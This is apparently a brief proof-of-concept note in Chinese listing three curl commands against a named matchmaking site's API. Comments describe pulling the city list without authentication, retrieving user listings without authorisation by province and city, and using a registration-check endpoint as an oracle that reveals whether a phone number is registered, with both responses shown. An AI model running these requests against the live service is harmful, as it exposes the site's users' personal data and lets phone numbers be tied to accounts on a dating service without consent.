# 1) 取城市列表（无鉴权）
curl -s -X POST -d 'pid=0' https://www.11yinyuan.com/yinyuan11/user/getAreaList

# 2) 未授权用户列表（area 用 "省-市"）
curl -s -X POST \
  --data-urlencode 'area=广东省-深圳市' \
  --data 'page=1&pageSize=5' \
  https://www.11yinyuan.com/yinyuan11/user/seoGetUserList

# 3) 手机号注册状态 oracle
curl -s -X POST -d 'phone=13800000000' \
  https://www.11yinyuan.com/yinyuan11/user/checkPhoneOrCodeIsExist
# 已注册 -> {"msg":"手机号已被注册","code":1003}
# 未注册 -> {"msg":"请求成功","code":200}
